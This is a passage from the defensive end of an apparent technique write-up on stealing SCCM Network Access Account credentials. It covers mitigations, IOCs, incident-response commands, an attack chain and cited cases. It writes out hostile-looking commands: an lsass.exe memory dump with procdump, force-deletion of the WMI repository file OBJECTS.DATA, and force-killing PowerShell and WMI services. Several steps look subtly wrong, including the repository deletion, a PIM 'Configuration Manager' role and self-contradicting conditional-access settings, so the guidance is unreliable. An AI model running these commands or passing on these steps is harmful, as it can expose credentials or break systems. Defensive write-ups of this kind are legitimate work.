  Remove-Item "C:\Windows\System32\wbem\Repository\OBJECTS.DATA" -Force -ErrorAction SilentlyContinue
  # Note: May require restart after file removal
  ```
  
  **Deployment (via Group Policy):**
  1. Create a PowerShell script `Remove-NAA.ps1` with above content
  2. Open **Group Policy Management Editor** (gpmc.msc)
  3. Create new GPO: **Computer Configuration** → **Policies** → **Windows Settings** → **Scripts** → **Startup**
  4. Add script: `Remove-NAA.ps1`
  5. Link to OU containing SCCM clients
  6. Run `gpupdate /force` on all clients
  7. Restart machines to ensure WMI cleanup

### Priority 2: HIGH

- **Implement Conditional Access Policies:** Block NAA accounts from authenticating outside of SCCM management points.
  
  **Manual Steps (Azure Portal - Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block NAA Outside SCCM`
  4. **Assignments:**
     - Users: Select the NAA account specifically
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - **Locations:** **Any location** (leave default)
     - Add custom condition: **Allowed locations for SCCM management points only**
  6. **Access controls:**
     - **Block access**
  7. Enable policy: **On**
  8. Click **Create**

- **Enforce Least Privilege on NAA Account:** If NAA must remain (for legacy SCCM versions), ensure it has **only** permissions needed for distribution point access.
  
  **Manual Steps (Active Directory):**
  1. Open **Active Directory Users and Computers**
  2. Locate the NAA account → **Properties** → **Member Of**
  3. Remove from all groups except: `Domain Users`
  4. Ensure NAA is **NOT** member of:
     - Domain Admins
     - Enterprise Admins
     - Schema Admins
     - Any server admin groups
     - LAPS read permission groups
  5. Click **Apply** → **OK**
  
  **Validation (PowerShell):**
  ```powershell
  $naaAccount = Get-ADUser -Filter {Name -like "*NAA*"} -Properties MemberOf
  if ($naaAccount.MemberOf.Count -gt 1) {
      Write-Host "WARNING: NAA account is overprivileged"
      $naaAccount.MemberOf
  } else {
      Write-Host "NAA account has minimal privilege (only Domain Users)"
  }
  ```

- **Enable Privilege Identity Management (PIM) for SCCM Admin Accounts:** Enforce time-limited, approval-based access to SCCM administrative roles.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Roles**
  2. Select **Configuration Manager** role (if federated)
  3. Click **Settings** → Configure:
     - **MFA required:** ON
     - **Approval required:** ON
     - **Maximum activation duration:** 4 hours
  4. Save settings

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** 
  - `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` (read/accessed)
  - `C:\Windows\Temp\SharpSCCM.exe` (or any variant in Temp directories)
  
- **Registry:** 
  - HKLM\Software\Microsoft\SMS\Client\Configuration\Client Properties (accessed)
  - HKLM\System\CurrentControlSet\Services\ccmexec (service manipulation attempts)
  
- **Network:** 
  - HTTP/HTTPS requests to SCCM management point paths:
    - `/ccm_system_windowsauth/request`
    - `/ccm_system/request`
    - `/SMS_MP/.sms_pol/*`
  - Port 80/443 to management points from unexpected source IPs

### Forensic Artifacts

- **Disk:** 
  - `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` contains DPAPI-encrypted NAA blobs
  - PowerShell history: `$PROFILE\PSReadLine\ConsoleHost_history.txt` may contain WMI query commands
  
- **Memory:** 
  - Lsass.exe memory dump may contain decrypted NAA passwords if extraction occurred
  - SharpSCCM.exe process image will contain decrypted credentials in heap
  
- **Cloud (Entra ID):** 
  - Azure AD Audit Logs: Computer account creation (Event: "Add computer")
  - SigninLogs: Authentication attempts by NAA account outside expected context
  
- **Event Logs:**
  - Event ID 4688: PowerShell/WMIC process creation with CCM queries
  - Event ID 5857: WMI queries to Root\CCM namespaces
  - Event ID 4741: Computer account creation anomalies

### Response Procedures

1. **Isolate:**
   
   **Command (PowerShell - Remove from network):**
   ```powershell
   # Disconnect network adapter
   Get-NetAdapter -Name "Ethernet" | Disable-NetAdapter -Confirm:$false
   
   # Alternative: Remove network permissions via IP configuration
   Remove-NetIPAddress -InterfaceAlias "Ethernet" -Confirm:$false
   ```
   
   **Manual (On-Premises):**
   - Physically unplug network cable from affected workstation
   - OR: Move device to isolated VLAN with no internet/domain access
   
   **Manual (Azure):**
   - Navigate to **Azure Portal** → **Virtual Machines** → Select VM
   - **Networking** → **Disconnect** network interface

2. **Collect Evidence:**
   
   **Command (PowerShell):**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export WMI Activity Log
   wevtutil epl "Microsoft-Windows-WMI-Activity/Operational" "C:\Evidence\WMI_Activity.evtx"
   
   # Capture memory dump (requires procdump.exe or similar)
   procdump64.exe -ma lsass.exe "C:\Evidence\lsass.dmp"
   
   # Copy WMI repository (may require restart)
   robocopy "C:\Windows\System32\wbem\Repository" "C:\Evidence\WMI_Backup" /E /R:5 /W:5
   ```
   
   **Manual (Event Viewer):**
   - Open **Event Viewer** → Select **Security** log
   - Right-click → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Repeat for `Microsoft-Windows-WMI-Activity/Operational`

3. **Remediate:**
   
   **Immediate (Stop Active Attack):**
   ```powershell
   # Kill any running WMI/PowerShell processes
   Get-Process -Name "powershell" | Where-Object { $_.Handle -gt 0 } | Stop-Process -Force
   Stop-Service -Name "WinRM" -Force
   Stop-Service -Name "WmiPrvSE" -Force
   
   # Disable SCCM client temporarily
   Stop-Service -Name "ccmexec" -Force
   Set-Service -Name "ccmexec" -StartupType Disabled
   ```
   
   **Secondary (Credential Compromise Response):**
   ```powershell
   # If NAA credentials were exposed:
   # 1. Immediately reset NAA password
   Set-ADAccountPassword -Identity (Get-ADUser -Filter {Name -like "*NAA*"}) `
     -NewPassword (ConvertTo-SecureString -AsPlainText "$(New-Guid)" -Force)
   
   # 2. Force re-authentication of all SCCM clients
   # (Restart ccmexec service on all clients)
   
   # 3. Clear local WMI credential store
   Remove-WmiObject -Class "CCM_NetworkAccessAccount" -Namespace "root\ccm\policy\machine\actualconfig"
   ```
   
   **Tertiary (Long-Term Remediation):**
   - Follow **Defensive Mitigations** section above to transition to Enhanced HTTP
   - Audit all resources accessed with NAA credentials in past 30 days
   - Reset passwords on all systems where NAA authenticated

4. **Notify and Escalate:**
   - Alert: Incident Response Team, SOC, CISO
   - Document: Time of discovery, systems affected, credentials compromised
   - Escalate if: NAA had domain admin privileges or LAPS read access

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial user account access via phishing |
| **2** | **Privilege Escalation** | [PE-VALID-008] SCCM Client Push Account Abuse | Attacker compromises SCCM deployment account for local admin access |
| **3** | **Current Step** | **[PE-VALID-009]** | **Extract NAA credentials from SCCM client machine** |
| **4** | **Privilege Escalation (Domain)** | [PE-VALID-004] Delegation Misconfiguration | Use overprivileged NAA to escalate within domain (if NAA has constrained delegation) |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash (PTH) | Use NAA credentials to authenticate to servers with local admin access |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Use compromised SCCM infrastructure to promote account to domain admin |
| **7** | **Impact** | [CA-DUMP-006] NTDS.dit Extraction | Extract entire domain database for credential harvesting |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: TrueSecRec SCCM Privilege Escalation (2024)

- **Target:** Mid-size financial services organization with 2,000+ endpoints
- **Timeline:** Initial compromise (October 2024) → NAA extraction (November 2024) → Domain admin achieved (December 2024)
- **Technique Status:** NAA account misconfigured with membership in Tier-1 Admin group; attacker used extracted NAA credentials to access SCCM database server with SA (System Administrator) SQL rights
- **Impact:** Complete infrastructure compromise; attacker deployed malware to 1,800+ endpoints via SCCM application deployment
- **Reference:** [TrueSecRec: SCCM Tier Killer](https://www.truesec.com/hub/blog/sccm-tier-killer)

### Example 2: SpecterOps - Phantom Credentials of SCCM (2022)

- **Target:** Enterprise with legacy SCCM 2012 R2 still in production
- **Timeline:** SCCM client deployed (2018) → NAA set but never rotated → Credentials persist even after client uninstallation (2021) → Attackers discover credentials in WMI repository (2022)
- **Technique Status:** NAA credentials remained valid and unrotated for 4+ years; credentials present on 15+ former client machines despite SCCM client removal
- **Impact:** Attackers used legacy NAA credentials to authenticate as legacy domain user (account not updated with Modern RBAC)
- **Reference:** [SpecterOps: The Phantom Credentials of SCCM](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)

### Example 3: GuidePoint Security - SCCM in-the-wild Exploitation (2025)

- **Target:** Global pharmaceutical organization with Enhanced HTTP **not** enabled despite recommendation
- **Timeline:** Reconnaissance (January 2025) → Device quota abuse (February 2025) → NAA extraction via sccmsecrets.py (February 2025) → LAPS password access achieved (February 2025)
- **Technique Status:** Attackers registered 8 fake machine accounts using standard domain user quota (10 devices default) to request SCCM policies; automated extraction of NAA credentials without local admin access
- **Impact:** Access to 500+ server LAPS passwords; lateral movement to Critical Infrastructure (CI) designated systems
- **Reference:** [GuidePoint Security: SCCM Exploitation](https://www.guidepointsecurity.com/blog/sccm-exploitation-compromising-network-access-accounts/)

---

## 16. COMPLIANCE & REGULATORY CONTEXT

This technique directly violates security requirements in modern compliance frameworks:

- **GDPR Art. 32(1)(b):** Requires organizations to implement technical measures to ensure security of personal data. NAA credential exposure violates this principle.
- **NIS2 Art. 21:** Mandates cyber risk management and incident handling; uncontrolled NAA credentials fail risk mitigation requirements.
- **ISO 27001 A.9.2.3:** Requires management of privileged access rights; overprivileged NAA violates this control.
- **NIST 800-53 AC-3:** Requires enforced access controls; NAA in cleartext on client systems fails this requirement.

Organizations should document NAA usage and remediation timelines to regulatory bodies (EU regulators, CISA for critical infrastructure).

---

## 17. REFERENCES & AUTHORITATIVE SOURCES

1. [Microsoft: SCCM Enhanced HTTP Documentation](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/enable-tls-1-2)
2. [SpecterOps: The Phantom Credentials of SCCM](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
3. [GuidePoint Security: SCCM Exploitation](https://www.guidepointsecurity.com/blog/sccm-exploitation-compromising-network-access-accounts/)
4. [Synacktiv: SCCMSecrets.py - SCCM Policy Exploitation](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)
5. [Palo Alto Networks: SCCM Enterprise Backbone or Attack Vector](https://www.paloaltonetworks.com/blog/security-operations/sccm-enterprise-backbone-or-attack-vector-part-2/)
6. [Mayyhem: SharpSCCM GitHub Repository](https://github.com/Mayyhem/SharpSCCM)
7. [TrueSecRec: SCCM Tier Killer](https://www.truesec.com/hub/blog/sccm-tier-killer)
8. [The Hacker Recipes: SCCM Privilege Escalation](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)
9. [SnapAttack: Detection Engineer's Guide to SCCM Misconfiguration Abuse](https://blog.snapattack.com/a-detection-engineers-guide-to-sccm-misconfiguration-abuse-50fa059a446e)
10. [MITRE ATT&CK: T1078.002 Valid Accounts - Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

---